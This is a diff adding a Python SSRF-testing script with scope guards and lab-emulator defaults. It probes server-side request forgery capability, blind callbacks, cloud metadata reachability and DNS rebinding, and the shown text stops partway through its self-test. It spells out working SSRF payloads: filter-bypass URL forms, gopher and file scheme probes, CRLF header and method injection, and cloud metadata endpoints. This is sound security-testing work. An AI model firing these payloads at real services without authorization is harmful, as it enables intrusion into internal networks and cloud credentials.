@@ -1,0 +1,1018 @@
+#!/usr/bin/env python3
+"""Mythos ssrfprobe — what the SSRF actually controls, and what that reaches.
+
+"SSRF confirmed" is not a finding, it is a question half answered. The impact
+depends entirely on the primitive: a GET-only, blind, no-header SSRF cannot read
+AWS credentials behind IMDSv2 and cannot read GCP or Azure metadata at all,
+because those require a method and headers the primitive does not control
+(`knowledge/web/ssrf.md`). So this script classifies the primitive first and
+reports method control and header control as separate, explicit facts, instead
+of printing "cloud credentials reachable" off one OAST hit.
+
+  scripts/ssrfprobe probe <url> <parameter> ...     what the primitive controls
+  scripts/ssrfprobe metadata <url> <parameter> ...  the four cloud surfaces with
+                                                     their real requirements
+  scripts/ssrfprobe blind <url> <parameter> ...     OAST with a per-attempt token
+                                                     and a negative control
+  scripts/ssrfprobe rebind <host> ...               does the target resolve the
+                                                     name more than once, and
+                                                     does it honour a short TTL
+  scripts/ssrfprobe --selftest
+
+SCOPE APPLIES TO THE DESTINATION TOO. AGENTS.md is explicit: a request the
+target makes on your behalf counts as yours, so the host you point the SSRF at
+must be in the scope file as well as the target. This script checks both and
+refuses rather than warning, and it never writes to the scope file. If your OAST
+host is not in scope, add it in an editor before the run, not here.
+
+Nothing here reads or stores credentials: the metadata paths are the instance
+listings, and a path that names a credential surface is refused. No internal
+range scanning: one or two named hosts, as the playbook says.
+
+`metadata` points at the lab emulator by default: http://cloud-metadata for
+IMDSv1/GCP/Azure and http://cloud-metadata-v2 for the IMDSv2 shape
+($MYTHOS_METADATA_LAB, $MYTHOS_METADATA_LAB_V2). Those hosts live on the lab's
+internal network with no published port, so they are only reachable through the
+SSRF sink itself, which is the point. A real link-local target needs --real and
+--i-have-authorization, and is still subject to the scope check and to the
+programme's rules.
+"""
+import argparse
+import importlib.machinery
+import importlib.util
+import json
+import os
+import pathlib
+import random
+import re
+import socket
+import ssl
+import string
+import struct
+import sys
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
+
+UA = "mythos-ssrfprobe/1.0 (authorized security testing)"
+ROOT = pathlib.Path(__file__).resolve().parent.parent
+# The lab emulator (lab/cloud/metadata.py, lab/docker-compose.yml) runs on the
+# internal network `mythos-lab-metadata` with no published port, reachable only
+# through the SSRF sinks in cloud-app — which is the point: a destination that
+# can only be reached through the bug. IMDSv1 is on at `cloud-metadata` and
+# IMDSv2-required at `cloud-metadata-v2`, so the v2 shape has its own base.
+LAB_METADATA = os.environ.get("MYTHOS_METADATA_LAB", "http://cloud-metadata")
+LAB_METADATA_V2 = os.environ.get("MYTHOS_METADATA_LAB_V2", "http://cloud-metadata-v2")
+
+# ---------------------------------------------------------------- plumbing
+
+_mods = {}
+
+
+def mod(name):
+    if name not in _mods:
+        rel = {"scope-guard": "hooks/scope-guard.py"}[name]
+        loader = importlib.machinery.SourceFileLoader(
+            f"mythos_{name}".replace("-", "_"), str(ROOT / rel))
+        spec = importlib.util.spec_from_loader(loader.name, loader)
+        m = importlib.util.module_from_spec(spec)
+        loader.exec_module(m)
+        _mods[name] = m
+    return _mods[name]
+
+
+def require_in_scope(*items):
+    """Both ends. The target and the destination it will fetch.
+
+    This is the one rule in this file that cannot be relaxed by a flag: the
+    guard around the agent's tool calls only warns, and a warning about a
+    request to a third party's server arrives after that server was hit.
+    """
+    sg = mod("scope-guard")
+    bad = []
+    for item in items:
+        if not item:
+            continue
+        probe = item if "//" in str(item) else f"https://{item}/"
+        bad += sg.check(probe)["offenders"]
+    if bad:
+        raise SystemExit(
+            "ssrfprobe: refusing, out of scope: " + ", ".join(sorted(set(bad)))
+            + "\n  The destination of an SSRF counts as a host you touched. Add it "
+              "to scope.yaml in an editor, or pick a destination already in scope.")
+
+
+def scope_rate(default=5.0):
+    path = os.environ.get("MYTHOS_SCOPE")
+    if not path:
+        return default
+    try:
+        text = pathlib.Path(path).read_text(encoding="utf-8", errors="replace")
+    except OSError:
+        return default
+    try:
+        import yaml  # type: ignore
+        rules = (yaml.safe_load(text) or {}).get("rules") or {}
+        if isinstance(rules, dict) and rules.get("rate_limit_rps") is not None:
+            return float(rules["rate_limit_rps"])
+    except Exception:
+        pass
+    m = re.search(r"^\s*rate_limit_rps\s*:\s*([0-9.]+)", text, re.M)
+    try:
+        return float(m.group(1)) if m else default
+    except (TypeError, ValueError):
+        return default
+
+
+_LAST, _GAP, _SENT = [0.0], [0.0], [0]
+
+
+def pace():
+    if _GAP[0] <= 0:
+        return
+    wait = _LAST[0] + _GAP[0] - time.monotonic()
+    if wait > 0:
+        time.sleep(wait)
+    _LAST[0] = time.monotonic()
+
+
+def send(method, url, headers=None, body=None, timeout=10, insecure=False):
+    require_in_scope(url)
+    pace()
+    _SENT[0] += 1
+    data = body.encode() if isinstance(body, str) else body
+    req = urllib.request.Request(url, data=data, method=method,
+                                 headers={"User-Agent": UA, **(headers or {})})
+    ctx = ssl._create_unverified_context() if insecure else None
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
+            raw = r.read(200_000)
+            return {"status": r.status, "headers": {k.lower(): v for k, v in r.headers.items()},
+                    "body": raw.decode("utf-8", "replace"), "url": r.geturl()}
+    except urllib.error.HTTPError as e:
+        raw = e.read(200_000) if e.fp else b""
+        return {"status": e.code,
+                "headers": {k.lower(): v for k, v in (e.headers or {}).items()},
+                "body": raw.decode("utf-8", "replace"), "url": url}
+    except Exception as e:
+        return {"status": None, "headers": {}, "body": f"{type(e).__name__}: {e}", "url": url}
+
+
+def token(n=10):
+    """A per-attempt token, so a callback maps back to its injection point."""
+    alpha = string.ascii_lowercase + string.digits
+    return "m" + "".join(random.choice(alpha) for _ in range(n))
+
+
+def inject(url, parameter, value):
+    """Replace one query parameter's value, keeping the rest of the URL."""
+    parts = urllib.parse.urlsplit(url)
+    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
+    q = [(k, value if k == parameter else v) for k, v in q]
+    if parameter not in [k for k, _ in q]:
+        q.append((parameter, value))
+    return urllib.parse.urlunsplit(
+        (parts.scheme, parts.netloc, parts.path, urllib.parse.urlencode(q), parts.fragment))
+
+# ---------------------------------------------------------- the OAST log
+
+
+def parse_oast_log(text):
+    """Normalise the lab catcher's JSONL and interactsh's JSON into one shape.
+
+    The lab catcher (`lab/oast/catcher.py`) records proto, src, method, path,
+    host, ua and body — but no other request headers, so header control can
+    never be confirmed from it alone. interactsh's `-json` output carries the
+    whole raw request, which can. The difference matters, so it is reported:
+    "headers: unknown" is an honest answer and "headers: not forwarded" would
+    not be.
+    """
+    hits = []
+    for line in (text or "").splitlines():
+        line = line.strip()
+        if not line or not line.startswith("{"):
+            continue
+        try:
+            rec = json.loads(line)
+        except Exception:
+            continue
+        raw = rec.get("raw-request") or rec.get("raw_request") or ""
+        hit = {"proto": rec.get("proto") or rec.get("protocol") or "",
+               "src": rec.get("src") or rec.get("remote-address") or rec.get("remote_address") or "",
+               "method": rec.get("method") or "",
+               "path": rec.get("path") or rec.get("full-id") or "",
+               "host": rec.get("host") or "",
+               "ua": rec.get("ua") or "",
+               "name": rec.get("name") or rec.get("unique-id") or "",
+               "ts": rec.get("ts") or rec.get("timestamp") or "",
+               "raw_headers": None}
+        if raw:
+            lines = raw.replace("\r\n", "\n").split("\n")
+            if lines and " " in lines[0]:
+                hit["method"] = hit["method"] or lines[0].split(" ")[0]
+                hit["path"] = hit["path"] or lines[0].split(" ")[1]
+            hdrs = {}
+            for l in lines[1:]:
+                if not l.strip():
+                    break
+                if ":" in l:
+                    k, _, v = l.partition(":")
+                    hdrs[k.strip().lower()] = v.strip()
+            hit["raw_headers"] = hdrs
+            hit["ua"] = hit["ua"] or hdrs.get("user-agent", "")
+            hit["host"] = hit["host"] or hdrs.get("host", "")
+        hits.append(hit)
+    return hits
+
+
+def hits_for(hits, tok):
+    """Every callback carrying this attempt's token, in any field."""
+    out = []
+    for h in hits:
+        blob = json.dumps(h).lower()
+        if tok.lower() in blob:
+            out.append(h)
+    return out
+
+
+def fetch_oast(a):
+    """The catcher's log, or a file the agent already saved."""
+    if a.oast_log_file:
+        return pathlib.Path(a.oast_log_file).read_text(encoding="utf-8", errors="replace")
+    if a.oast_log:
+        return send("GET", a.oast_log, {}, None, a.timeout, a.insecure)["body"]
+    return ""
+
+# ------------------------------------------------- 1. probe: capability
+
+# The URL forms worth one request each. Every one has a control: the same shape
+# pointing at the destination you are allowed to reach. Without the control you
+# are measuring an allowlist, not a bug.
+def url_forms(tok, oast_host, oast_port=None):
+    hostport = f"{oast_host}:{oast_port}" if oast_port else oast_host
+    return [
+        ("plain", f"http://{hostport}/{tok}-plain"),
+        ("https", f"https://{hostport}/{tok}-https"),
+        ("no-scheme", f"//{hostport}/{tok}-noscheme"),
+        ("userinfo", f"http://allowed.invalid@{hostport}/{tok}-userinfo"),
+        ("fragment", f"http://{hostport}/{tok}-fragment#@allowed.invalid/"),
+        ("subdomain-suffix", f"http://allowed.invalid.{hostport}/{tok}-suffix"),
+        ("backslash", f"http://allowed.invalid\\@{hostport}/{tok}-backslash"),
+        ("double-encoded", f"http%3A%2F%2F{hostport}%2F{tok}-dblenc"),
+        # Scheme acceptance: for anything but http(s) only the fact that the
+        # scheme was accepted is interesting, so ftp (which can call home) is
+        # the one that gets an OAST path.
+        ("ftp", f"ftp://{hostport}/{tok}-ftp"),
+        ("gopher", f"gopher://{hostport}/_{tok}-gopher"),
+        ("dict", f"dict://{hostport}/{tok}-dict"),
+        ("file", "file:///etc/hostname"),
+        # Header control, if the parameter reaches the request line unescaped.
+        ("crlf-header", f"http://{hostport}/{tok}-crlf%0d%0aX-Mythos-Probe:%20{tok}"),
+        # Method control via the request line, same mechanism.
+        ("crlf-method", f"http://{hostport}/{tok}-ignore%20HTTP/1.1%0d%0aPUT%20/{tok}-putline"),
+    ]
+
+
+def classify(signals):
+    """Turn observations into the capability statement a report needs.
+
+    `signals` keys, each True/False/None (None = not determined):
+      hit, response_visible, redirect_followed, method_controlled,
+      header_controlled, scheme_http, scheme_nonhttp, body_controlled
+    """
+    cap = {k: signals.get(k) for k in
+           ("hit", "response_visible", "redirect_followed", "method_controlled",
+            "header_controlled", "scheme_http", "scheme_nonhttp", "body_controlled")}
+    reach = []
+    if not cap["hit"]:
+        reach.append("no callback: this is not a confirmed SSRF yet")
+    else:
+        reach.append("the server fetches a URL you influence")
+        reach.append("response visible" if cap["response_visible"]
+                     else "blind: the OAST hit is the only oracle")
+        if cap["redirect_followed"]:
+            reach.append("redirects are followed, so a filter that checks the first "
+                         "hop only is bypassable")
+
+    # The whole point of this subcommand.
+    both = bool(cap["method_controlled"]) and bool(cap["header_controlled"])
+    unknown = cap["method_controlled"] is None or cap["header_controlled"] is None
+    cap["imdsv2"] = {
+        "reachable": both,
+        "why": ("method AND header control confirmed: IMDSv2's PUT /latest/api/token "
+                "plus X-aws-ec2-metadata-token is in reach" if both else
+                "not determined: method or header control was not measured" if unknown else
+                "IMDSv2 needs a PUT with X-aws-ec2-metadata-token-ttl-seconds and then a "
+                "GET with X-aws-ec2-metadata-token. This primitive controls "
+                f"method={bool(cap['method_controlled'])} headers="
+                f"{bool(cap['header_controlled'])}, so it cannot reach IMDSv2 "
+                "credentials. Report internal-network reach, not credential theft.")}
+    cap["gcp_azure"] = {
+        "reachable": bool(cap["header_controlled"]),
+        "why": ("header control confirmed: GCP needs Metadata-Flavor: Google and Azure "
+                "needs Metadata: true" if cap["header_controlled"] else
+                "not determined" if cap["header_controlled"] is None else
+                "GCP denies every request without Metadata-Flavor: Google and Azure "
+                "without Metadata: true. No header control means no GCP or Azure "
+                "metadata, whatever the network reach is.")}
+    cap["imdsv1"] = {
+        "reachable": bool(cap["hit"]) and bool(cap["scheme_http"]),
+        "why": ("a plain GET is enough for IMDSv1, which is still the default unless "
+                "the instance is set to token-required" if cap["hit"] else "no callback")}
+    cap["reach"] = reach
+    return cap
+
+
+def cmd_probe(a):
+    oast = urllib.parse.urlsplit(a.oast if "//" in a.oast else f"http://{a.oast}")
+    require_in_scope(a.url, oast.netloc or a.oast)
+    tok = a.token or token()
+    out = {"subcommand": "probe", "url": a.url, "parameter": a.parameter,
+           "token": tok, "attempts": [], "capability": None, "notes": []}
+
+    for label, value in url_forms(tok, oast.hostname or a.oast, oast.port):
+        target = inject(a.url, a.parameter, value)
+        r = send(a.method, target, {}, None, a.timeout, a.insecure)
+        out["attempts"].append({
+            "label": label, "value": value, "status": r["status"],
+            "bytes": len(r["body"]),
+            # Response visibility is only knowable if your OAST host serves a
+            # string you can recognise; the lab catcher answers a flat "ok", so
+            # without --marker this stays unknown rather than False.
+            "marker_in_response": bool(a.marker) and a.marker in r["body"],
+            "error_mentions_host": (oast.hostname or a.oast) in r["body"]})
+
+    # Control: the same parameter pointing at a destination the application is
+    # supposed to allow. Without this a 403 everywhere reads as "filtered" when
+    # the parameter simply never fetched anything.
+    if a.control:
+        require_in_scope(a.control)
+        c = send(a.method, inject(a.url, a.parameter, a.control), {}, None,
+                 a.timeout, a.insecure)
+        out["control"] = {"value": a.control, "status": c["status"],
+                          "bytes": len(c["body"])}
+
+    hits = hits_for(parse_oast_log(fetch_oast(a)), tok)
+    out["oast_hits"] = hits
+    methods = {h["method"] for h in hits if h["method"]}
+    header_control = None
+    if any(h["raw_headers"] is not None for h in hits):
+        header_control = any("x-mythos-probe" in (h["raw_headers"] or {}) for h in hits)
+    elif hits:
+        out["notes"].append(
+            "the OAST log carries no request headers (the lab catcher records only "
+            "Host and User-Agent), so header control stays UNKNOWN. Point --oast-log "
+            "at interactsh, whose JSON has the raw request, before claiming it.")
+    out["capability"] = classify({
+        "hit": bool(hits),
+        "response_visible": (any(x["marker_in_response"] for x in out["attempts"])
+                             if a.marker else None),
+        "redirect_followed": any("-redirect" in (h["path"] or "") for h in hits) or None,
+        "method_controlled": (("PUT" in methods or "POST" in methods) if methods else None),
+        "header_controlled": header_control,
+        "scheme_http": any(h["proto"] in ("http", "https", "") for h in hits) or None,
+        "scheme_nonhttp": None,
+        "body_controlled": None,
+    })
+    out["notes"].append(
+        "Redirect following is proved by your OAST host answering 302 to a second "
+        "token path, which this script cannot make it do: configure the redirector, "
+        "re-run, and the second path shows up as a hit.")
+    return out
+
+# ------------------------------------------------- 2. metadata surfaces
+
+# Paths that hand out a credential. Reaching them is the impact statement; the
+# playbook and AGENTS.md both say do not read or store them, so they are refused
+# here rather than left to judgement.
+# "/latest/api/token" is deliberately NOT here: the IMDSv2 session token is a
+# precondition for any v2 read, carries no privilege on its own, and leaving it
+# out would make the v2 shape untestable.
+CREDENTIAL_PATHS = ("security-credentials", "identity/oauth2",
+                    "service-accounts", "sshkeys", "userdata", "user-data",
+                    "customdata", "attributes/kube-env")
+
+# The request shapes, each with the requirement that makes it work. Taken from
+# knowledge/web/ssrf.md, which cites the AWS EC2 User Guide, the GCE metadata
+# docs and Microsoft Learn's IMDS page.
+METADATA = {
+    "aws-imdsv1": {
+        "host": "169.254.169.254", "method": "GET", "path": "/latest/meta-data/",
+        "headers": {}, "lab": "default",
+        "requires": "nothing: a plain GET. Still the default unless the instance "
+                    "is set to token-required.",
+        "defeated_by": "IMDSv2 required (HttpTokens=required)"},
+    "aws-imdsv2-token": {
+        "host": "169.254.169.254", "method": "PUT", "path": "/latest/api/token",
+        "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, "lab": "v2",
+        "requires": "method control (PUT) and header control. A PUT carrying "
+                    "X-Forwarded-For is rejected, and the default response hop "
+                    "limit of 1 drops anything proxied.",
+        "defeated_by": "a GET-only or header-less SSRF"},
+    "aws-imdsv2-get": {
+        "host": "169.254.169.254", "method": "GET", "path": "/latest/meta-data/",
+        "headers": {"X-aws-ec2-metadata-token": "<token from aws-imdsv2-token>"},
+        "lab": "v2",
+        "requires": "the token from the PUT above, in a header",
+        "defeated_by": "no header control"},
+    "gcp": {
+        "host": "metadata.google.internal", "method": "GET",
+        "path": "/computeMetadata/v1/instance/",
+        "headers": {"Metadata-Flavor": "Google"}, "lab": "default",
+        "requires": "header control: every request without Metadata-Flavor: Google "
+                    "is denied.",
+        "defeated_by": "no header control"},
+    "azure": {
+        "host": "169.254.169.254", "method": "GET",
+        "path": "/metadata/instance?api-version=2021-02-01",
+        "headers": {"Metadata": "true"}, "lab": "default",
+        "requires": "header control, and the request must not carry "
+                    "X-Forwarded-For.",
+        "defeated_by": "no header control, or a proxy that adds X-Forwarded-For"},
+    "alibaba": {
+        "host": "100.100.100.200", "method": "GET", "path": "/latest/meta-data/",
+        "headers": {}, "lab": None,
+        "requires": "nothing, where the hardened mode is off",
+        "defeated_by": "hardened mode (token required, like IMDSv2)"},
+}
+
+
+def metadata_requests(base=None, base_v2=None, clouds=None):
+    """The exact request per cloud, against the lab bases or the real hosts.
+
+    Offline and asserted: this table is what the report quotes when it says
+    what the primitive would have to control, so it must not drift. The lab
+    keeps the real method and the real required headers, because the emulator
+    enforces them; only the host changes.
+    """
+    out = []
+    for name, spec in METADATA.items():
+        if clouds and name not in clouds:
+            continue
+        hdrs = dict(spec["headers"])
+        if base and spec["lab"]:
+            root = ((base_v2 or base) if spec["lab"] == "v2" else base).rstrip("/")
+            url = f"{root}{spec['path']}"
+        elif base:
+            # No emulator stands in for this cloud, so there is nothing to probe
+            # in lab mode rather than something misleading.
+            continue
+        else:
+            url = f"http://{spec['host']}{spec['path']}"
+        for bad in CREDENTIAL_PATHS:
+            if bad in spec["path"]:
+                raise AssertionError(f"{name}: credential path in the probe table")
+        out.append({"name": name, "method": spec["method"], "url": url,
+                    "headers": hdrs, "requires": spec["requires"],
+                    "defeated_by": spec["defeated_by"]})
+    return out
+
+
+def cmd_metadata(a):
+    base = None if a.real else (a.lab or LAB_METADATA)
+    base_v2 = None if a.real else (a.lab_v2 or LAB_METADATA_V2)
+    if a.real and not a.i_have_authorization:
+        raise SystemExit(
+            "ssrfprobe metadata --real also needs --i-have-authorization: a link-local "
+            "metadata probe is only allowed where the programme says so. Without it, "
+            f"the default target is the lab emulator at {a.lab or LAB_METADATA} "
+            "($MYTHOS_METADATA_LAB).")
+    reqs = metadata_requests(base, base_v2)
+    require_in_scope(a.url, *[r["url"] for r in reqs])
+    out = {"subcommand": "metadata", "url": a.url, "parameter": a.parameter,
+           "target": (f"{base} (IMDSv2: {base_v2})" if base
+                      else "the real link-local addresses"), "attempts": [],
+           "notes": ["Only the instance listings are probed. A path that hands out a "
+                     "credential is refused by this script, and a reachable listing "
+                     "plus its status code is the whole impact statement."]}
+    for r in reqs:
+        # The SSRF carries the URL; the method and headers it would need are
+        # reported, not faked, because the primitive is what decides them.
+        probe = inject(a.url, a.parameter, r["url"])
+        res = send(a.method, probe, {}, None, a.timeout, a.insecure)
+        body = res["body"] or ""
+        out["attempts"].append({
+            "cloud": r["name"], "would_need": {"method": r["method"],
+                                               "headers": r["headers"]},
+            "requires": r["requires"], "defeated_by": r["defeated_by"],
+            "probe_url": r["url"], "status": res["status"],
+            "bytes": len(body),
+            "looks_like_metadata": looks_like_metadata(r["name"], body),
+            "verdict": metadata_verdict(r, res)})
+    return out
+
+
+def looks_like_metadata(name, body):
+    """Cheap markers for a real metadata answer, so a 200 error page is not one."""
+    low = (body or "")[:4000].lower()
+    if name.startswith("aws") or name == "alibaba":
+        return any(k in low for k in ("instance-id", "ami-id", "placement",
+                                      "hostname\n", "iam/"))
+    if name == "gcp":
+        return any(k in low for k in ("instance/", "project/", "numeric-project-id"))
+    if name == "azure":
+        return any(k in low for k in ('"compute"', '"vmid"', "subscriptionid"))
+    return False
+
+
+def metadata_verdict(req, res):
+    if res["status"] is None:
+        return f"request failed ({res['body'][:60]})"
+    if looks_like_metadata(req["name"], res["body"]):
+        return (f"{req['name']} answered through the SSRF. Needs: {req['requires']} "
+                "Report the reachable path and the status code; do not read the "
+                "credential surfaces.")
+    if res["status"] < 400:
+        return ("the target answered, but the body does not look like metadata: most "
+                "likely the application's own error page. Not a hit.")
+    return f"{res['status']}: not reachable this way ({req['defeated_by']})"
+
+# -------------------------------------------------------- 3. blind SSRF
+
+
+def cmd_blind(a):
+    oast = urllib.parse.urlsplit(a.oast if "//" in a.oast else f"http://{a.oast}")
+    require_in_scope(a.url, oast.netloc or a.oast)
+    host = oast.hostname or a.oast
+    port = f":{oast.port}" if oast.port else ""
+    out = {"subcommand": "blind", "url": a.url, "parameters": a.parameter,
+           "trials": [], "notes": []}
+
+    # One token per parameter per attempt, so a hit that arrives minutes later
+    # still names the injection point that caused it. A shared token would make
+    # every parameter look guilty.
+    for param in a.parameter:
+        tok = token()
+        probe = inject(a.url, param, f"http://{host}{port}/{tok}")
+        r = send(a.method, probe, {}, None, a.timeout, a.insecure)
+        out["trials"].append({"parameter": param, "arm": "attack", "token": tok,
+                              "status": r["status"], "bytes": len(r["body"])})
+        # The control for a blind test is the same request with a destination
+        # the application is meant to accept, or none at all: if the hit arrives
+        # for both, something else is fetching the URL (a scanner, the agent's
+        # own browser, a link preview on the way).
+        ctrl_tok = token()
+        ctrl_value = a.control or f"http://{host}{port}/{ctrl_tok}"
+        cr = send(a.method, inject(a.url, param, ctrl_value), {}, None,
+                  a.timeout, a.insecure)
+        out["trials"].append({"parameter": param, "arm": "control",
+                              "token": ctrl_tok if not a.control else "(allowed host)",
+                              "value": ctrl_value,
+                              "status": cr["status"], "bytes": len(cr["body"])})
+
+    if a.wait:
+        time.sleep(min(a.wait, 120))
+    hits = parse_oast_log(fetch_oast(a))
+    for t in out["trials"]:
+        t["hits"] = hits_for(hits, t["token"]) if t["token"].startswith("m") else []
+    out["verdict"] = blind_verdict(out["trials"])
+    out["notes"].append(
+        "A DNS-only hit from a resolver the target does not control is not proof: "
+        "check the source IP is plausibly the target's, and read the method and "
+        "User-Agent of the hit to learn which component fetched.")
+    return out
+
+
+def blind_verdict(trials):
+    lines = []
+    by = {}
+    for t in trials:
+        by.setdefault(t["parameter"], {})[t["arm"]] = t
+    for param, arms in by.items():
+        att = len(arms.get("attack", {}).get("hits") or [])
+        ctl = len(arms.get("control", {}).get("hits") or [])
+        if att and not ctl:
+            lines.append(f"{param}: {att} hit(s) on the attack arm, 0 on the control: "
+                         "confirmed SSRF mapped to this parameter")
+        elif att and ctl:
+            lines.append(f"{param}: both arms were hit ({att}/{ctl}): something other "
+                         "than the target is fetching these URLs; find it before reporting")
+        else:
+            lines.append(f"{param}: no hit. Either no fetch, no egress, or the callback "
+                         "has not landed yet (re-read the log with --oast-log later)")
+    return lines
+
+# ----------------------------------------------------- 4. DNS rebinding
+
+
+def dns_query(name, server, qtype=1, timeout=3.0):
+    """One A query over UDP, returning the answers and the smallest TTL.
+
+    Detection only. The reason for hand-rolling this instead of
+    socket.getaddrinfo is that the TTL is the whole question: a name the target
+    resolves twice is only rebindable if the first answer is allowed to expire
+    between the validator's lookup and the fetcher's.
+    """
+    qid = random.randrange(0, 65535)
+    header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
+    q = b"".join(bytes([len(l)]) + l.encode("idna") for l in name.rstrip(".").split("."))
+    payload = header + q + b"\x00" + struct.pack(">HH", qtype, 1)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(timeout)
+    try:
+        s.sendto(payload, (server, 53))
+        data, _ = s.recvfrom(4096)
+    finally:
+        s.close()
+    if len(data) < 12 or struct.unpack(">H", data[:2])[0] != qid:
+        raise OSError("DNS: no matching answer")
+    ancount = struct.unpack(">H", data[6:8])[0]
+    i = 12
+    while i < len(data) and data[i]:
+        i += data[i] + 1
+    i += 5                                            # root label + qtype/qclass
+    answers, ttls = [], []
+    for _ in range(ancount):
+        if i >= len(data):
+            break
+        if data[i] & 0xC0 == 0xC0:                    # compression pointer
+            i += 2
+        else:
+            while i < len(data) and data[i]:
+                i += data[i] + 1
+            i += 1
+        if i + 10 > len(data):
+            break
+        rtype, _rclass, ttl, rdlen = struct.unpack(">HHIH", data[i:i + 10])
+        i += 10
+        rdata = data[i:i + rdlen]
+        i += rdlen
+        ttls.append(ttl)
+        if rtype == 1 and rdlen == 4:
+            answers.append(socket.inet_ntoa(rdata))
+        elif rtype == 5:
+            answers.append("(CNAME)")
+    return {"answers": answers, "ttl": min(ttls) if ttls else None}
+
+
+def resolvers():
+    """Nameservers from /etc/resolv.conf, because the host's resolver is the
+    one that would answer the target's lookup in the lab."""
+    out = []
+    try:
+        for line in pathlib.Path("/etc/resolv.conf").read_text().splitlines():
+            m = re.match(r"\s*nameserver\s+([0-9.]+)", line)
+            if m:
+                out.append(m.group(1))
+    except OSError:
+        pass
+    return out or ["127.0.0.1"]
+
+
+def rebind_verdict(samples, ttl):
+    """Judge the observation. Detection only: no rebinding is attempted."""
+    seen = [tuple(s) for s in samples if s]
+    distinct = {s for s in seen}
+    notes = []
+    if ttl is None:
+        notes.append("no TTL in the answers: cannot say whether a cache would expire")
+    elif ttl <= 5:
+        notes.append(f"TTL {ttl}s: short enough that a second lookup a moment later "
+                     "gets a fresh answer, which is the precondition for rebinding")
+    elif ttl <= 60:
+        notes.append(f"TTL {ttl}s: short, but a resolver or a client that pins the "
+                     "first answer for a minute closes the window")
+    else:
+        notes.append(f"TTL {ttl}s: too long for rebinding against a cache that honours it")
+    if len(distinct) > 1:
+        notes.append(f"{len(distinct)} different answer sets over {len(seen)} lookups: "
+                     "the name already returns more than one address")
+    elif len(seen) > 1:
+        notes.append(f"the same answer over {len(seen)} lookups")
+    reb = (ttl is not None and ttl <= 60) or len(distinct) > 1
+    return {"rebinding_preconditions": reb, "reasons": notes,
+            "next": ("The target still has to resolve the name twice — once to "
+                     "validate, once to connect — and must not pin the first address. "
+                     "That is a property of the target's HTTP client, not of DNS, and "
+                     "it is shown by a validator that accepts the name while the fetch "
+                     "lands somewhere else. Detection stops here.")}
+
+
+def cmd_rebind(a):
+    require_in_scope(a.host)
+    server = a.resolver or resolvers()[0]
+    samples, ttls = [], []
+    for _ in range(max(2, min(a.samples, 6))):
+        pace()
+        _SENT[0] += 1
+        try:
+            r = dns_query(a.host, server, timeout=a.timeout)
+        except Exception:
+            samples.append([])
+            ttls.append(None)
+            continue
+        samples.append(r["answers"])
+        ttls.append(r["ttl"])
+        if a.gap:
+            time.sleep(min(a.gap, 10))
+    real_ttls = [t for t in ttls if t is not None]
+    return {"subcommand": "rebind", "host": a.host, "resolver": server,
+            "lookups": samples, "ttls": ttls,
+            **rebind_verdict(samples, min(real_ttls) if real_ttls else None)}
+
+# --------------------------------------------------------------- render
+
+
+def render(res):
+    out = [f"# ssrfprobe {res['subcommand']}"]
+    if res["subcommand"] == "probe":
+        out += ["", f"token {res['token']}", "", "## attempts"]
+        out += [f"{a['status']} {a['label']:<18} {a['value'][:70]}"
+                + ("  MARKER" if a["marker_in_response"] else "")
+                for a in res["attempts"]]
+        if res.get("control"):
+            out += ["", f"control ({res['control']['value']}): {res['control']['status']}"]
+        out += ["", f"## OAST hits ({len(res.get('oast_hits') or [])})"]
+        out += [f"{h['ts']} {h['proto']} {h['method']} {h['path']} from {h['src']} "
+                f"ua={h['ua'][:40]}" for h in (res.get("oast_hits") or [])] or ["(none)"]
+        cap = res["capability"]
+        out += ["", "## what the primitive controls"]
+        out += [f"{k}: {cap[k]}" for k in ("hit", "response_visible", "redirect_followed",
+                                           "method_controlled", "header_controlled")]
+        out += ["", "## what that reaches"]
+        for k in ("imdsv1", "imdsv2", "gcp_azure"):
+            out.append(f"{k}: reachable={cap[k]['reachable']}")
+            out.append(f"    {cap[k]['why']}")
+        out += [""] + [f"- {r}" for r in cap["reach"]]
+    elif res["subcommand"] == "metadata":
+        out += ["", f"target: {res['target']}", ""]
+        for a in res["attempts"]:
+            out.append(f"## {a['cloud']}")
+            out.append(f"would need: {a['would_need']['method']} with "
+                       f"{a['would_need']['headers'] or 'no headers'}")
+            out.append(f"requires: {a['requires']}")
+            out.append(f"{a['status']} {a['probe_url']} -> {a['verdict']}")
+            out.append("")
+    elif res["subcommand"] == "blind":
+        for t in res["trials"]:
+            out.append(f"{t['parameter']} [{t['arm']}] {t['status']} token={t['token']} "
+                       f"hits={len(t.get('hits') or [])}")
+        out += [""] + [f"- {v}" for v in res["verdict"]]
+    elif res["subcommand"] == "rebind":
+        out += ["", f"resolver {res['resolver']}"]
+        out += [f"lookup {i + 1}: {s or '(failed)'} ttl={t}"
+                for i, (s, t) in enumerate(zip(res["lookups"], res["ttls"]))]
+        out += ["", f"rebinding preconditions: {res['rebinding_preconditions']}"]
+        out += [f"- {n}" for n in res["reasons"]]
+        out += ["", res["next"]]
+    for n in res.get("notes") or []:
+        out += ["", n]
+    return "\n".join(out)
+
+# -------------------------------------------------------------- selftest
+
+
+def _selftest():
+    """Asserts on the classification and the request tables, offline.
+
+    These two are what the report quotes. A wrong capability classification is
+    how "cloud credentials reachable" gets written about a GET-only SSRF, and a
+    wrong metadata shape is how a true negative becomes a false one.
+    """
+    fails = []
+
+    def eq(got, want, label):
+        if got != want:
+            fails.append(f"{label}: got {got!r}, want {want!r}")
+
+    def ok(cond, label):
+        if not cond:
+            fails.append(label)
+
+    # --- capability classification: the point of the whole file
+    get_only = classify({"hit": True, "method_controlled": False,
+                         "header_controlled": False, "scheme_http": True})
+    eq(get_only["imdsv2"]["reachable"], False,
+       "a GET-only, header-less SSRF does NOT reach IMDSv2")
+    eq(get_only["gcp_azure"]["reachable"], False,
+       "and reaches neither GCP nor Azure metadata")
+    eq(get_only["imdsv1"]["reachable"], True, "but IMDSv1 needs nothing")
+    ok("method=False" in get_only["imdsv2"]["why"]
+       and "headers=False" in get_only["imdsv2"]["why"]
+       and "cannot reach IMDSv2" in get_only["imdsv2"]["why"],
+       "the IMDSv2 answer names both controls and refuses the claim")
+    full = classify({"hit": True, "method_controlled": True, "header_controlled": True,
+                     "scheme_http": True})
